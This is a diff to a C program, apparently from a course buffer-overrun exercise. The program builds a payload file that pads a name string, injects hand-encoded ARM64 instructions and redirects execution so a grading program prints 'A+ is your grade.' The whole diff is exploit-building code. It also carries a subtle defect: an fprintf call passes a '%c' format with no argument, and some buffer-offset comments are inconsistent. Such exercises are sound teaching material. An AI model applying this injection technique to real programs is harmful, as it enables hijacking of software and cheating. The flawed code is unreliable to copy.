@@ -6,26 +6,29 @@ int main(void)
     unsigned long ulData1;
     unsigned int uiData2;
     unsigned int uiData3;
+    unsigned int uiData4;
 
-    ulData1 = 0x42006c; /* address to the instructions below; */
-    uiData2 = 0x10000040; /* adr x0, 0x420074 */
-    uiData3 = 0x17FF8201; /* b 0x400874 */
+    ulData1 = 0x420068; /* address to the instructions below; */
+    uiData2 = 0xD28001E1; /* mov x1, #0x0A */
+    uiData3 = 0x10000040; /* adr x0, 0x420074 */
+    uiData4 = 0x17FF8201; /* b 0x400874 */
 
     psFile = fopen("dataAplus", "w");
 
-    /* buf[0 - 17] */
-    fprintf(psFile, "Maxwell and Melody");
-    /* buf[18-19] */
+    /* buf[0-13] */
+    fprintf(psFile, "Max and Melody");
+    /* buf[14-15] */
     fprintf(psFile, "%c", '\0');
     fprintf(psFile, "%c", '\0');
-    /* buf[20-23] */
+    /* buf[16-19] */
     fwrite(&uiData2, sizeof(unsigned int), 1, psFile);
-    /* buf[24-27] */
+    /* buf[20-23] */
     fwrite(&uiData3, sizeof(unsigned int), 1, psFile);
-    /* buf[28-45] */
-    fprintf(psFile, "A+ is your grade.");
-    /* buf[45-47] */
-    fprintf(psFile, "%c", '\0');
+    /* buf[24-27] */
+    fwrite(&uiData4, sizeof(unsigned int), 1, psFile);
+    /* buf[28-46] */
+    fprintf(psFile, "A+ is your grade.%c");
+    /* buf[46-47] */
     fprintf(psFile, "%c", '\0');
     fprintf(psFile, "%c", '\0');
     /* buf[48-55] (x30) */
